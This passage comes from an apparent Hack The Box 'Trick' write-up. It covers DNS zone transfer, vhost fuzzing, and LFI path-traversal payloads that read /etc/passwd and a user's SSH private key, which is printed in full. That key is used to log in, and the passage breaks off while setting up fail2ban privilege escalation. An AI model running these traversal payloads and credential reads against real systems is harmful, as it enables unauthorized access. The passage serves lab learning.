</span></span></code></pre></div><p>Few ports are open including <em>(22,25,53,80)</em> and I can see that port <em>53</em> running a dns server is open. Usually dns services operate on udp ports, so I&rsquo;ll also scan top <em>1000 udp</em> ports on this machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap -A -sU 10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 14:00 EEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE         SERVICE  VERSION
</span></span><span style="display:flex;"><span>53/udp   open          domain   ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| dns-nsid: 
</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
</span></span><span style="display:flex;"><span>68/udp   open|filtered dhcpc
</span></span><span style="display:flex;"><span>631/udp  open|filtered ipp
</span></span><span style="display:flex;"><span>5353/udp open|filtered zeroconf
</span></span><span style="display:flex;"><span>Device type: remote management|webcam|phone|general purpose|storage-misc
</span></span><span style="display:flex;"><span>Running: Avocent embedded, AXIS embedded, Google Android 2.X, Linux 2.6.X|3.X, ZyXEL embedded
</span></span><span style="display:flex;"><span>OS CPE: cpe:/h:axis:207w_network_camera cpe:/o:google:android:2.2 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.17 cpe:/o:linux:linux_kernel:3.8 cpe:/h:zyxel:nsa-210
</span></span><span style="display:flex;"><span>Too many fingerprints match this host to give specific OS details
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 49194/udp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   139.39 ms 10.10.16.1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   73.82 ms  10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1231.47 seconds
</span></span></code></pre></div><h3 id="interacting-with-services">Interacting With Services</h3>
<h4 id="port-80-tcp">Port 80 (TCP)</h4>
<p>Navigating to the web server on port 80, I didn&rsquo;t find anything of interest.</p>
<p><img src="main_page_port80.png" alt="Main Page Port 80"></p>
<p>It&rsquo;s a single static page with no useful information.</p>
<h4 id="port-53-udptcp">Port 53 (UDP/TCP)</h4>
<p>I&rsquo;ll try first to look for 

<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer" target="_blank"><em>Zone Transfer</em></a> if enabled in order to get more information about the target since I don&rsquo;t even know its domain name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166
</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">84</span> msec
</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:13:16 EEST <span style="color:#ae81ff">2022</span>
</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">56</span>
</span></span></code></pre></div><p>Howerver I didn&rsquo;t get anything useful, that&rsquo;s why I&rsquo;ll try next by guessing the domain from the machine&rsquo;s name <em>trick.htb</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166 trick.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb
</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	NS	trick.htb.
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	A	127.0.0.1
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	AAAA	::1
</span></span><span style="display:flex;"><span>preprod-payroll.trick.htb. <span style="color:#ae81ff">604800</span> IN	CNAME	trick.htb.
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">240</span> msec
</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:21:21 EEST <span style="color:#ae81ff">2022</span>
</span></span><span style="display:flex;"><span>;; XFR size: <span style="color:#ae81ff">6</span> records <span style="color:#f92672">(</span>messages 1, bytes 231<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>From the results above, I can see that <em>trick.htb</em> is a valid domain name. It also discloses a new domain <em>preprod-payroll.trick.htb</em>, so I&rsquo;ll add these to my <em>/etc/hosts</em> file.</p>
<p><code>sudo echo -e '10.10.11.166\ttrick.htb , preprod-payroll.trick.htb' | sudo tee -a /etc/hosts</code></p>
<h2 id="enumerating-web-server">Enumerating Web Server</h2>
<h3 id="vhost-enumeration">VHOST Enumeration</h3>
<p>After some simple directory bruteforcing on <em>preprod-payroll.trick.htb</em>, I came to a dead end. The only thing I found was a login page and a <em>database</em> directory giving me a <em>403</em> forbidden, and I wasn&rsquo;t able to find any files there with the simple wordlists I use.</p>
<p>So I had to enumerate <em>vhosts</em> looking for some hidden domains. Again using a simple wordlist from 

<a href="https://github.com/danielmiessler/SecLists" target="_blank"><em>seclists</em></a> called 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank"><em>subdomains-top1million-5000.txt</em></a> I wasn&rsquo;t able to find anything, however this time I had a clue about the manner they name their domain, it seems that they append the prefix <em>preprod-</em> to thier domain, so why not doing the same and bruteforce vhosts again using this prefix.</p>
<ul>
<li>
<p>Enumerating vhosts using 

<a href="https://github.com/OJ/gobuster" target="_blank"><em>Gobuster</em></a>:</p>
<ul>
<li>I can create a new wordlist from 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank"><em>subdomains-top1million-5000.txt</em></a> by appending <em>preprod-</em> to each line using sed: <code>sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &gt; new_custom_wordlist.txt</code></li>
<li>Then use vhost flag with gobuster <code>gobuster vhost -w new_custom_wordlist.txt -u trick.htb --append-domain</code></li>
</ul>
</li>
<li>
<p>Enumerating vhosts using 

<a href="https://github.com/ffuf/ffuf" target="_blank"><em>Ffuf</em></a>:</p>
<ul>
<li>Here I don&rsquo;t need to create a new wordlist, but I do need to filter requests on the size because the server responds with <em>200 response code</em> on any random subdomain, so the only way to know if the subdomain is valid is by getting a different content length: <code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -fs 5480</code></li>
<li><em>Note</em>: This is the same technique that <em>gobuster vhost</em> flag uses.</li>
</ul>
</li>
</ul>
<p>I got a valid domain <em>preprod-marketing.trick.htb</em> so I&rsquo;ll add it to my <em>/etc/hosts</em> file.</p>
<p><code>sudo echo -e '10.10.11.166\tpreprod-marketing.trick.htb' | sudo tee -a /etc/hosts</code></p>
<p>Navigating to this new domain, I can clearly see that it is a new website:</p>
<p><img src="preprod-marketing.trick.htb-main-page.png" alt="preprod-marketing.trick.htb Main Page"></p>
<h3 id="exploiting-lfi">Exploiting LFI</h3>
<p>Navigating to one of the present tabs, I noticed <em>?page=services.html</em> GET parameter, which might indicate a possible 

<a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank"><em>LFI vulnerability</em></a>.</p>
<p>Again, I&rsquo;ll use 

<a href="https://github.com/ffuf/ffuf" target="_blank"><em>Ffuf</em></a> to fuzz this parameter using <em>LFI</em> payloads from 

<a href="https://github.com/danielmiessler/SecLists" target="_blank"><em>seclists</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ -fs <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 153ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 225ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 86ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 96ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 97ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 88ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 99ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 91ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 93ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 94ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 100ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 105ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 119ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 122ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>920/920<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">416</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:02<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</span></span></code></pre></div><p>And I got several hits with a payload like <code>....//....//....//....//....//....//....//etc/passwd</code>, so now I&rsquo;ll use curl to read local files from this server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//etc/passwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>michael:x:1001:1001::/home/michael:/bin/bash
</span></span></code></pre></div><h2 id="getting-user">Getting User</h2>
<p>From <em>/etc/passwd</em> I can see that <em>michael</em> is a user on this machine, so I&rsquo;ll try to read his <em>private SSH key</em> which will usually be present in <em>/home/[username]/.ssh/id_rsa</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
</span></span><span style="display:flex;"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
</span></span><span style="display:flex;"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
</span></span><span style="display:flex;"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
</span></span><span style="display:flex;"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
</span></span><span style="display:flex;"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
</span></span><span style="display:flex;"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
</span></span><span style="display:flex;"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
</span></span><span style="display:flex;"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
</span></span><span style="display:flex;"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
</span></span><span style="display:flex;"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
</span></span><span style="display:flex;"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
</span></span><span style="display:flex;"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
</span></span><span style="display:flex;"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
</span></span><span style="display:flex;"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
</span></span><span style="display:flex;"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
</span></span><span style="display:flex;"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
</span></span><span style="display:flex;"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
</span></span><span style="display:flex;"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
</span></span><span style="display:flex;"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
</span></span><span style="display:flex;"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
</span></span><span style="display:flex;"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
</span></span><span style="display:flex;"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
</span></span><span style="display:flex;"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>And it worked, so now I&rsquo;ll be able to <em>SSH</em> into the server as user <em>michael</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa &gt; michael_id_rsa
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> michael_id_rsa
</span></span><span style="display:flex;"><span>$ ssh -i michael_id_rsa michael@trick.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Fri Oct <span style="color:#ae81ff">28</span> 17:15:31 <span style="color:#ae81ff">2022</span> from 10.10.14.105
</span></span><span style="display:flex;"><span>michael@trick:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>security<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>michael@trick:~$ cat user.txt
</span></span><span style="display:flex;"><span>043**************************bda
</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
<p>I can see that <em>michael</em> is part of <em>security</em> group (using <code>id</code> command), and if I run <code>sudo -l</code> I get the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> michael on trick:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User michael may run the following commands on trick:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/fail2ban restart
</span></span></code></pre></div><p>User <em>michael</em> can restart 

<a href="https://www.fail2ban.org/wiki/index.php/Main_Page" target="_blank"><em>fail2ban</em></a> service, which is a service that monitors log files for certain services like apache and SSH looking for any sign of bruteforce and blocks the corresponding IP address.
In addition, if I search for files owned by <em>security</em> group:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ find / -group security 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
</span></span></code></pre></div><p>I can see that <em>action.d</em> directory of 

<a href="https://www.fail2ban.org/wiki/index.php/Main_Page" target="_blank"><em>fail2ban</em></a> service is owned by security group, so I might be able to abuse this for privilege escalation to root.</p>
<h2 id="getting-root">Getting root</h2>
<ul>
<li>References:
<ul>
<li>How fail2ban exactly works (config files &hellip;): 

<a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server" target="_blank">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></li>
<li><em>Abuse</em> write permission to files inside <em>action.d</em> folder: 

<a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/" target="_blank">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
</ul>
</li>
</ul>
<p>Even though I have write permission on <em>action.d</em> directory, I do not have write permission to any file inside it, which means that I cannot override any file, however I can <em>create</em> and <em>move</em> files around (or better said <em>rename</em> files).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:/etc/fail2ban/action.d$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">288</span>
</span></span><span style="display:flex;"><span>drwxrwx--- <span style="color:#ae81ff">2</span> root security  <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> root root      <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">3879</span> Oct <span style="color:#ae81ff">28</span> 18:21 abuseipdb.conf
